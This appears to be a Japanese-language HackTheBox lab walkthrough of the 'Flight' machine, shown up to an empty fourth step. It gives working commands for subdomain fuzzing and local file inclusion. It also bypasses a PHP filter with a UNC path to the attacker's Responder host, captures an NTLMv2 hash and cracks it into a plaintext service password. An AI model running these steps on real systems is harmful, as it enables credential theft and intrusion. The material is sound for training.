## STEP 1
```sh
└─$ rustscan -a 10.129.228.120 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.228.120:53
Open 10.129.228.120:80
Open 10.129.228.120:88
Open 10.129.228.120:135
Open 10.129.228.120:139
Open 10.129.228.120:389
Open 10.129.228.120:445
Open 10.129.228.120:464
Open 10.129.228.120:593
Open 10.129.228.120:636
Open 10.129.228.120:3268
Open 10.129.228.120:3269
Open 10.129.228.120:9389
Open 10.129.228.120:49667
Open 10.129.228.120:49673
Open 10.129.228.120:49674
Open 10.129.228.120:49695
Open 10.129.228.120:49725
10.129.228.120 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49695,49725]
```


## STEP 2
ドメイン名取得
```sh
└─$ netexec smb 10.129.228.120                                                                                     
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
```
hosts編集
```sh
└─$  echo '10.129.228.120 flight.htb' | sudo tee -a /etc/hosts
10.129.228.120 flight.htb
```
80番にアクセス  
めぼしい情報は特になし  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_01.png">  
サブドメイン列挙  
別ウェブページを探索するため、サイズが異なるレスポンスを実施するドメインを調査
```sh
└─$ curl http://flight.htb -I
HTTP/1.1 200 OK
Date: Tue, 14 Oct 2025 08:07:10 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
Last-Modified: Thu, 24 Feb 2022 05:58:10 GMT
ETag: "1b9d-5d8bd444f0080"
Accept-Ranges: bytes
Content-Length: 7069
Content-Type: text/html
```
schoolというサブドメイン発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.flight.htb' -u http://10.129.228.120 -fs 7069

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.120
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 286ms]
:: Progress: [19966/19966] :: Job [1/1] :: 129 req/sec :: Duration: [0:02:22] :: Errors: 0 ::
```
hosts追加
```sh
└─$ tail -n 1 /etc/hosts
10.129.228.120 flight.htb school.flight.htb
```


## STEP 3
school.flight.htbにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_02.png">  
ページ内の「Home」「About Us」「Blog」にそれぞれリンクが設定されていた  
```sh
http://school.flight.htb/index.php?view=home.html
http://school.flight.htb/index.php?view=about.html
http://school.flight.htb/index.php?view=blog.html
```
「About Us」「Blog」にアクセス、ページの１部分がファイルインクルード処理で変更されていことが分かる  
phpでファイルインクルード処理を実施しているが、lfiまたはrfiの脆弱性があるかも
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_03.png">  
レスポンスサイズ「1102」（ファイルが存在しない場合）はフィルタしてfuzzing  
lfiの脆弱性を確認！
```sh
└─$ ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u 'http://school.flight.htb/index.php?view=FUZZ' -fs 1102     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://school.flight.htb/index.php?view=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1102
________________________________________________

C:/Windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 493ms]
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1926, Words: 315, Lines: 52, Duration: 493ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 45670, Words: 8921, Lines: 700, Duration: 257ms]
c:/xampp/phpMyAdmin/config.inc.php [Status: 200, Size: 3153, Words: 274, Lines: 92, Duration: 259ms]
c:/xampp/sendmail/sendmail.ini [Status: 200, Size: 3198, Words: 431, Lines: 103, Duration: 254ms]
C:/xampp/apache/logs/access.log [Status: 200, Size: 263632, Words: 24083, Lines: 1638, Duration: 258ms]
C:/xampp/apache/logs/error.log [Status: 200, Size: 264345, Words: 28206, Lines: 1168, Duration: 262ms]
c:/xampp/apache/conf/httpd.conf [Status: 200, Size: 22337, Words: 2849, Lines: 597, Duration: 251ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 2460, Words: 588, Lines: 58, Duration: 252ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 4785, Words: 771, Lines: 110, Duration: 252ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 1509, Words: 231, Lines: 47, Duration: 254ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 1926, Words: 315, Lines: 52, Duration: 258ms]
c:/xampp/php/php.ini    [Status: 200, Size: 75093, Words: 9638, Lines: 2026, Duration: 254ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1378, Words: 173, Lines: 35, Duration: 263ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 18737, Words: 8656, Lines: 318, Duration: 257ms]
c:/xampp/apache/logs/error.log [Status: 200, Size: 283597, Words: 30173, Lines: 1239, Duration: 290ms]
c:/xampp/apache/logs/access.log [Status: 200, Size: 279512, Words: 25586, Lines: 1747, Duration: 295ms]
:: Progress: [236/236] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
php.iniを確認、[リンク](https://web.archive.org/web/20240418085821/https://qiita.com/satorunooshie/items/39eda7b6a41909e89d29#allow_url_include)を参照  
allow_url_fopenが有効のためリモートファイルの読み込みは可能だが、allow_url_includeが無効のため実行はできないもよう
```sh
└─$ curl -s 'http://school.flight.htb/index.php?view=c:/xampp/php/php.ini' | grep 'allow_url_include\|allow_url_fopen'
allow_url_fopen = On
allow_url_include = Off
```
脆弱なindex.phpのソースコードをlfiで確認  
viewのパラメータに「..」や「//」などが含まれるとGET拒否される仕組み
```php
└─$ curl 'http://school.flight.htb/index.php?view=index.php'                           
<!DOCTYPE html>

~~~

<?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
    <div id="tagline">
      <div>
        <h4>Cum Sociis Nat PENATIBUS</h4>
        <p>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.</p>
      </div>
    </div>
<?php } ?>
  </div>
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}

?>

~~~
```
GET拒否されるviewパラメータを回避して、kaliのresponderに対するrfi実施  
rfiによってkaliのresponderにsmbアクセス・強制認証によりクレデンシャルを取得する
```sh
└─$ curl 'http://school.flight.htb/index.php?view=//10.10.16.4/share/a.txt'
```
flight\svc_apacheのntlmv2ハッシュ値を取得成功！
```sh
─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Responder IPv6             [dead:beef:4::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-SXXGVN35NIR]
    Responder Domain Name      [K6XI.LOCAL]
    Responder DCE-RPC Port     [47985]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.238.60
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E002D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```
取得したntlmv2ハッシュをクラック成功！
パスワード、S@Ss!K@*t13を取得
```sh
└─$ name-that-hash -f svc_apache.txt --no-banner
svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E0
02D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300
030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2
```
```sh
└─$ hashcat -a 0 -m 5600 svc_apache.txt /usr/share/wordlists/rockyou.txt --quiet
SVC_APACHE::flight:7480e093cd0cc6d2:875288c3e4026dc8af430f72bfabe029:010100000000000080d13ecedb3cdc01bafa2b06278ec63e00000000020008004b0036005800490001001e00570049004e002d00530058005800470056004e00330035004e004900520004003400570049004e002d00530058005800470056004e00330035004e00490052002e004b003600580049002e004c004f00430041004c00030014004b003600580049002e004c004f00430041004c00050014004b003600580049002e004c004f00430041004c000700080080d13ecedb3cdc0106000400020000000800300030000000000000000000000000300000e49fe70a59898e7f8bd0dfaacac25a27200865b470e26f8e5d5ffa5fa56151400a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:S@Ss!K@*t13
```


## STEP 4
